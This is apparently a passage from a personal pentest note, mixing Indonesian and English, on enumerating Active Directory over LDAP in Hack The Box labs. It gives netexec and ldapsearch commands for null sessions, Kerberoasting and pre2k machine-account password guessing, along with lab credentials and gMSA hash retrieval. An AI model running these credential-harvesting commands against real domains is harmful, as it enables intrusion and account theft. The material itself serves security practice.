adalah "phonebook" dari Active Directory. Semua object di domain — user, group, computer, GPO, SPN — tersimpan di sini. Kalau kita bisa query LDAP, kita bisa memetakan seluruh domain tanpa exploit apapun.
# Ports

| Port | Services |
| ---- | -------- |
| 389  | LDAP     |
| 636  | LDAPS    |

# Null Session
test credential
```shell
nxc ldap <IP> -u '' -p ''
```

Login
```shell
ldapsearch -H ldap://overwatch.htb -x -b 'DC=overwatch,DC=htb'
```

# Kerberoasting
```shell
nxc ldap 10.129.4.104 -u 'pentest' -p 'p3nt3st2025!&' --kerberoasting kerberoasting.txt
```
![](Attachments/Pasted%20image%2020260616092929.png)

# pre2k
When machine accounts are created with the "Assign this computer account as a pre-Windows 2000 computer" checkbox, their initial password is set to the lowercase hostname (without the `$`). These accounts were pre-created but never joined to the domain, so the password was never changed.
```shell
nxc ldap 10.129.4.198 -u 'pentest' -p 'p3nt3st2025!&' -M pre2k

# bisa null session juga
nxc ldap 10.129.4.198 -u '' -p '' --pre2k
```
![](Attachments/Pasted%20image%2020260616184912.png)
pada contoh diatas passwordnya adalah
`MS01$:ms01`
`EXCH01$:exch01`

biasnyha account dari output pre2k digunakan untuk serangan lanjuta GMSA
# GMSA
Akun GMSA biasanya ada `$` di akhirnya, seperti `MS01$` . 
karena kita menggunakan TGT, password bisa dikosongkan
![](Attachments/Pasted%20image%2020260618190850.png)
output dari GMSA adalah NTLM hash